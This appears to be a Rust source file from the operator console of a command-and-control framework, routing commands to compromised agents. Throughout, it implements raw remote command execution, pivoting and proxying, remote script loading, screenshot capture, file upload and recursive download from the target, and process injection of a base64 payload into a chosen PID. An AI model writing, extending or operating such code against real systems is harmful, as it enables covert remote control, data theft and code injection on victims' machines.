// ./src/menu/handlers.rs
use crate::common::{SharedSessions, Session, try_send_session_command};
use crate::file_transfer;
use crate::menu::{ui, proxy};
use std::fs;
use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64};
use std::path::Path;

/// Handle a global-menu command. Returns true only for `exit`/`quit`, so the
/// REPL loop can unwind (save history) before the shutdown is triggered.
pub fn handle_global(
    line: &str,
    sessions: &SharedSessions,
    current_session_id: &mut Option<u32>
) -> bool {
    let parts: Vec<&str> = line.split_whitespace().collect();
    if parts.is_empty() { return false; }

    match parts[0] {
        "help" => ui::print_help(),
        "sessions" => ui::print_sessions(sessions),
        "interact" => {
            if parts.len() < 2 {
                eprintln!("Usage: interact <id>");
            } else if let Ok(tid) = parts[1].parse::<u32>() {
                let map = &*sessions;
                if map.contains_key(&tid) {
                    *current_session_id = Some(tid);
                    eprintln!("[+] Interacting with Session {}.", tid);
                } else {
                    eprintln!("[-] ID not found.");
                }
            }
        },
        "exit" | "quit" => return true,
        _ => eprintln!("Unknown command."),
    }
    false
}

/// Route shutdown through the same graceful path server::run uses for
/// SIGTERM: it checkpoints the SQLite WAL and closes the DB cleanly before
/// the process exits. Exiting the REPL thread directly would skip all of it.
pub fn request_shutdown() {
    eprintln!("[*] Shutting down server (graceful)...");
    #[cfg(unix)]
    unsafe {
        // server::run intercepts SIGTERM via tokio::signal and performs the
        // shutdown cleanup once it arrives.
        libc::raise(libc::SIGTERM);
    }
    #[cfg(not(unix))]
    {
        // Non-Unix builds only handle Ctrl-C, which cannot be raised from a
        // thread portably; exit directly as before.
        std::process::exit(0);
    }
}

pub fn handle_session(
    line: &str,
    session_id: u32,
    sessions: &SharedSessions,
    proxies: crate::api::SharedProxies
) {
    // Re-acquire session lock to send command
    let map = &*sessions;
    let session = match map.get(&session_id) {
        Some(s) => s,
        None => {
            eprintln!("[-] Session {} lost.", session_id);
            return;
        }
    };

    if line == "proxy start" {
        proxy::start(session_id, proxies, session.tx.clone());
    }
    else if line == "proxy stop" {
        proxy::stop(session_id, &proxies, session.tx.clone());
    }
    else if line == "proxy list" {
        proxy::list(&proxies, session_id);
    }
    else if line == "pivot list" {
        let _ = try_send_session_command(session.id, &session.tx, build_pivot_list_command(), None);
    }
    else if line == "pivot stop" || line.starts_with("pivot stop ") {
        match build_pivot_stop_command(line.trim_start_matches("pivot stop").trim()) {
            Ok(cmd) => { let _ = try_send_session_command(session.id, &session.tx, cmd, None); },
            Err(e) => eprintln!("[-] {}", e),
        }
    }
    else if line == "extension list" {
        ui::print_extensions();
    }
    else if line.starts_with("extension load ") {
        handle_extension_load(line, &session);
    }
    else if line == "screenshot" {
        // Alias for `extension load screenshot` with no args: same script,
        // same ext:load path, no separate wire format.
        load_extension(&session, "screenshot", &[]);
    }
    else if line.starts_with("upload ") {
        handle_upload(line, &session);
    }
    else if line.starts_with("download ") {
        handle_download(line, &session);
    }
    else if line.starts_with("inject ") {
        handle_inject(line, &session);
    }
    else {
        // Raw command
        let _ = try_send_session_command(session.id, &session.tx, line.to_string(), None);
    }
}

fn handle_extension_load(line: &str, session: &Session) {
    let parts: Vec<&str> = line.split_whitespace().collect();
    if parts.len() >= 3 {
        let raw_args: Vec<&str> = parts.iter().skip(3).cloned().collect();
        load_extension(session, parts[2], &raw_args);
    } else {
        eprintln!("Usage: extension load <name> [args...]");
    }
}

/// Read ./extensions/<ext_name>.rhai, base64 it, and send it to the agent as
/// an `ext:load` command. Arguments that name existing local files are
/// uploaded as base64 content; anything else goes through as a literal.
fn load_extension(session: &Session, ext_name: &str, raw_args: &[&str]) {
    let path = format!("./extensions/{}.rhai", ext_name);
    
    // 1. Read the Rhai script
    let script_content = match fs::read_to_string(&path) {
        Ok(c) => c,
        Err(_) => {
            eprintln!("[-] Failed to read extension script: {}", path);
            return;
        }
    };
    let b64_script = BASE64.encode(script_content);

    // 2. Process Arguments (Auto-detect files)
    // If an argument exists as a file on disk, read it and B64 encode it.
    // Otherwise, pass it as a literal string.
    let mut processed_args = Vec::new();
    
    for arg in raw_args {
        let p = Path::new(arg);
        if p.exists() && p.is_file() {
            // It's a file! Read and encode.
            match fs::read(p) {
                Ok(bytes) => {
                    eprintln!("[*] Argument '{}' detected as file. Sending content ({} bytes)...", arg, bytes.len());
                    processed_args.push(BASE64.encode(bytes));
                },
                Err(e) => {
                    eprintln!("[-] Failed to read argument file '{}': {}", arg, e);
                    return;
                }
            }
        } else {
            // Not a file, pass literal
            processed_args.push(arg.to_string());
        }
    }

    // 3. Construct Command
    let mut cmd = format!("ext:load {}", b64_script);
    for arg in processed_args {
        cmd.push(' ');
        cmd.push_str(&arg);
    }

    if try_send_session_command(session.id, &session.tx, cmd, None) {
        eprintln!("[+] Extension '{}' sent.", ext_name);
    }
}

/// Build the `pivot:list` command the agent answers with its active pivot
/// listeners and their ids.
pub fn build_pivot_list_command() -> String {
    "pivot:list".to_string()
}

/// Build the `pivot:stop <id>` command that tears down one agent pivot
/// listener. The id must be a bare integer as shown by `pivot list`;
/// anything else is rejected locally instead of producing a malformed task.
pub fn build_pivot_stop_command(id_arg: &str) -> Result<String, String> {
    let id = id_arg.trim();
    if id.is_empty() {
        return Err("Usage: pivot stop <listener_id>".to_string());
    }
    match id.parse::<u32>() {
        Ok(n) => Ok(format!("pivot:stop {}", n)),
        Err(_) => Err(format!("invalid listener id '{}'; use a number from `pivot list`", id)),
    }
}

/// Build the `file:write|base_dir|rel_path|b64_data` command the agent's
/// handle_file_write expects. The agent splits on '|' and hands
/// base_dir/rel_path to write_file_simple, which joins them back together,
/// so the first path component becomes base_dir and the remainder rel_path;
/// the agent then re-creates exactly the relative path the operator typed.
/// Single-component paths use "." (the agent's working directory) as base.
pub fn build_upload_command(remote_path: &str, b64_data: &str) -> Result<String, String> {
    let path = remote_path.trim();
    if path.is_empty() {
        return Err("empty remote path".to_string());
    }
    if path.ends_with('/') || path.ends_with('\\') {
        return Err("remote path must name a file, not a directory".to_string());
    }
    // write_file_simple on the agent refuses absolute paths and parent
    // traversal; reject them here so the operator gets a local error instead
    // of a failed task on the agent.
    let bytes = path.as_bytes();
    let rooted = path.starts_with('/')
        || path.starts_with('\\')
        || (bytes.len() >= 2 && bytes[0].is_ascii_alphabetic() && bytes[1] == b':');
    if rooted {
        return Err(format!(
            "absolute remote path '{}' is not supported; give a path relative to the agent's working directory",
            path
        ));
    }
    if path.split(|c| c == '/' || c == '\\').any(|seg| seg == "..") {
        return Err("remote path must not contain '..'".to_string());
    }
    let (base_dir, rel_path) = match path.split_once('/') {
        Some((base, rest)) if !base.is_empty() && !rest.is_empty() => (base, rest),
        _ => (".", path),
    };
    Ok(format!("file:write|{}|{}|{}", base_dir, rel_path, b64_data))
}

fn handle_upload(line: &str, session: &Session) {
    let parts: Vec<&str> = line.split_whitespace().collect();
    if parts.len() == 3 {
        match file_transfer::read_file_to_b64(parts[1]) {
            Ok((b64, _)) => match build_upload_command(parts[2], &b64) {
                Ok(cmd) => {
                    if try_send_session_command(session.id, &session.tx, cmd, None) {
                        eprintln!("[+] Uploading {} bytes...", b64.len());
                    }
                },
                Err(e) => eprintln!("[-] Upload rejected: {}", e),
            },
            Err(e) => eprintln!("[-] File Error: {}", e),
        }
    } else { eprintln!("Usage: upload <local> <remote>"); }
}

fn handle_download(line: &str, session: &Session) {
    let args: Vec<&str> = line.split_whitespace().collect();
    let recursive = args.contains(&"-r");
    let path_opt = args.iter().find(|&&x| x != "download" && x != "-r");
    
    if let Some(path) = path_opt {
        if recursive {
            eprintln!("[*] RECURSIVE download '{}'...", path);
            let _ = try_send_session_command(session.id, &session.tx, format!("file:read_recursive|{}", path), None);
        } else {
            eprintln!("[*] Downloading '{}'...", path);
            let _ = try_send_session_command(session.id, &session.tx, format!("file:read|{}", path), None);
        }
    } else { eprintln!("Usage: download [-r] <remote_path>"); }
}

fn handle_inject(line: &str, session: &Session) {
    let parts: Vec<&str> = line.split_whitespace().collect();
    
    if parts.len() != 3 {
        eprintln!("Usage: inject <pid> <local_file_path>");
        return;
    }

    let pid = parts[1];
    let local_path = parts[2];

    match fs::read(local_path) {
        Ok(buffer) => {
            let b64_payload = BASE64.encode(buffer);
            let cmd = format!("proc:inject {} {}", pid, b64_payload);
            if try_send_session_command(session.id, &session.tx, cmd, None) {
                eprintln!("[+] Sending injection payload ({} bytes) for PID {}...", b64_payload.len(), pid);
            }
        },
        Err(e) => eprintln!("[-] Failed to read local file '{}': {}", local_path, e),
    }
}